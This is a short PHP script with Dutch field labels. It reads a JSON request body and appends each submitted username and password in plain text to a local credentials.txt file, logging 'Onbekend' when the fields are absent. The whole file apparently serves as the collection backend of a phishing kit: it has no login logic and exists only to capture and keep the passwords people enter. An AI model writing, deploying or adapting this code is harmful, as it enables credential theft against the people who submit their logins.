<?php

// Write credentials to file
function write_credentials ($username, $password) {
	file_put_contents('credentials.txt', "Gebruikersnaam: {$username}\nWachtwoord: {$password}\n", FILE_APPEND);
}

// Parse JSON data
$data = json_decode(file_get_contents('php://input'), true);
if (isset($data['username']) && isset($data['password'])) {
	write_credentials($data['username'], $data['password']);
} else {
	write_credentials('Onbekend', 'Onbekend');
}

//
exit;
